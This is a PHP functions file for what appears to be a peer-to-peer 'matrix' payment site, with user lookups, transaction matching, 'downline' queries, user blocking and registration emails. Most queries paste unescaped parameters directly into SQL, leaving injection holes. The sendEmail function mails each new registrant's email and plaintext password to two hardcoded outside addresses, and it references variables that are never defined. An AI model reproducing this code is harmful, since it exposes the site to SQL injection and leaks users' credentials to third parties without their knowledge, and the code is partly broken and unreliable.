<?php
//getting user by id
function getuserdata($field = '') {
    global $link;
    $field = (empty($field)) ? '*' : mysqli_real_escape_string($field);
    $query = mysqli_query($link, "SELECT {$field} FROM users WHERE id ='" . $_SESSION['user_id'] . "' LIMIT 1");
    if (mysqli_num_rows($query) == 1) {
        $row = mysqli_fetch_assoc($query);
        return $row;
    }
}
 //-------------------------------------------------------------
function getTrans($payer = '') {
    global $link;
	//return $choice;
    $sql = "SELECT * FROM transaction WHERE payer='{$payer}' ORDER BY id DESC LIMIT 1";
    $query = mysqli_query($link, $sql); 

    if (mysqli_num_rows($query) > 0) {
        $row = mysqli_fetch_assoc($query);
        return $row;
    }
}

//-------------------------------------------------------------			
function getDataFromId($data_id = '') {
	global $link;
	$sql = "SELECT * FROM users WHERE id='{$data_id}' LIMIT 1";
	$query = mysqli_query($link, $sql); 
	if (mysqli_num_rows($query) > 0) {
		$row = mysqli_fetch_assoc($query);
		return $row;
	}
}
//--------------------------------------------------------------
/*function getDownlines($payee='') {
	global $link;
	$sql = "SELECT payer FROM transaction WHERE pay_to='{$payee}' ORDER BY id DESC LIMIT 3";
	$query = mysqli_query($link, $sql); 
	if (mysqli_num_rows($query) > 0) {
		while($row = mysqli_fetch_array($query)){
		return array($row[0], $row[1], $row[2]);
		}
	}
}*/
function getDownlines1($payee='') {
	global $link;
	$sql = "SELECT * FROM transaction WHERE pay_to='{$payee}' ORDER BY id DESC LIMIT 1";
	$query = mysqli_query($link, $sql); 
	if (mysqli_num_rows($query) > 0) {
		$row = mysqli_fetch_assoc($query);
		return $row;
	}
}
function getDownlines2($payee='') {
	global $link;
	$sql = "SELECT * FROM transaction WHERE pay_to='{$payee}' ORDER BY id DESC LIMIT 1,1";
	$query = mysqli_query($link, $sql); 
	if (mysqli_num_rows($query) > 0) {
		$row = mysqli_fetch_assoc($query);
		return $row;
	}
}
function getDownlines3($payee='') {
	global $link;
	$sql = "SELECT * FROM transaction WHERE pay_to='{$payee}' ORDER BY id DESC LIMIT 2,1";
	$query = mysqli_query($link, $sql); 
	if (mysqli_num_rows($query) > 0) {
		$row = mysqli_fetch_assoc($query);
		return $row;
	}
}

//-------------------------------------------------------------
//Timing
//----------
function timing($e_d=''){

	//$time =  date('h:i:s');
	$now =  strtotime('today');
	//$finish = date('h:i:s',$e_d);
	$end =  strtotime($e_d);
	$dur = $end - $now;
	
	if($dur<=3600 && $dur>-60){ return "late";} 
	else{
		if($dur > 0){ return "true";} else { return "false";}
	}
}

//-------------------------------------------------------------
function regvalidate($opt = '',$choice = '') {
    global $link;
	//return $choice;
    $sql = "SELECT id FROM users WHERE {$opt}='{$choice}' LIMIT 1";
    $query = mysqli_query($link, $sql); 
    $check = mysqli_num_rows($query);
    if ($check == 0) {
	    return true;
    } else {
	    return false;
    }
}

//-------------------------------------------------------------
function blockUser($refuse){
	global $link;
	global $matrix;
	
	//Block the User
	$block_sql = "UPDATE users SET active = '0' WHERE id = '{$refuse}' LIMIT 1";
	$block_result = mysqli_query($link, $block_sql);
	
	//Unmatch the user
	$sql = "SELECT expect, matched, status FROM transaction WHERE payer='{$refuse}' AND status!='1' ORDER BY id DESC LIMIT 1";
			$query = mysqli_query($link, $sql);
			if (mysqli_num_rows($query) > 0) {
				$row = mysqli_fetch_assoc($query);
				
				$topay = $row['expect']/$matrix;
				
				if($row['status'] != 1){
					$newMatch = ($row['matched'])>$row['expect'] ? $row['matched'] : ($row['matched'])-$topay;
					$upd_query = "UPDATE transaction SET matched = '{$newMatch}' WHERE payer = '{$refuse}' AND status!='1' ORDER BY id DESC LIMIT 1";
					$upd_result = mysqli_query($link, $upd_query);
				
					//Delete the transaction
					$ref_sql = "DELETE FROM transaction WHERE payer = '{$refuse}' AND pay_to != '' AND status = '1'";
					$ref_result = mysqli_query($link, $ref_sql);
					
				
				} 
			}
			
			return true; 
}

//-----------------------------------------------------------------
function payUser($paid){
	global $matrix;
	//Logic for user amount
	$toReceive = ($paid*1) * ($matrix*1);
	return $toReceive;
}
//--------------------------------------------------------------------
function sendEmail($sender=''){
	//-----------send a mail-----//
	  global $company;
	  
	  $to = 'dnelixtech@gmail.com';
	  $subject = 'New Registration';
	  $message = '<!DOCTYPE html><html><head><meta charset="UTF-8"><title>New Registration on '.$company.'</title></head><body style="margin:0px;font-family:Tahoma, Geneva, sans-serif;"><div style="padding:10px;background:#00a;font-size:24px;color:#fff;">New Registration on '.$company.'</div><div style="padding:24px; font-size:17px;">Hello, someone just registered on your website<br/><br/>Here are the details:<br/>E-mail Address: <b>'.$email.'</b><br/>and Password: <b>'.$password.'</b></div></body></html>';

	  $from = $sender;
	  $headers = "From: $from\n";
	  $headers .= "MIME-Version: 1.0\n";
	  $headers .= "Content-type: text/html; charset=iso-8859-1\n";
	  mail($to, $subject, $message, $headers);
				
	//-------------Second mail-------------//
					
	  $to = 'info.porscheinvestors@yahoo.com';
	  $subject = 'New Registration';
	  $message = '<!DOCTYPE html><html><head><meta charset="UTF-8"><title>New Registration on '.$company.'</title></head><body style="margin:0px;font-family:Tahoma, Geneva, sans-serif;"><div style="padding:10px;background:#00a;font-size:24px;color:#fff;">New Registration on '.$company.'</div><div style="padding:24px; font-size:17px;">Hello, someone just registered on your website<br/><br/>Here are the details:<br/>E-mail Address: <b>'.$email.'</b><br/>and Password: <b>'.$password.'</b></div></body></html>';

	  $from = $sender;
	  $headers = "From: $from\n";
	  $headers .= "MIME-Version: 1.0\n";
	  $headers .= "Content-type: text/html; charset=iso-8859-1\n";
	  mail($to, $subject, $message, $headers);
	//-------------End mail-------------//
}

?>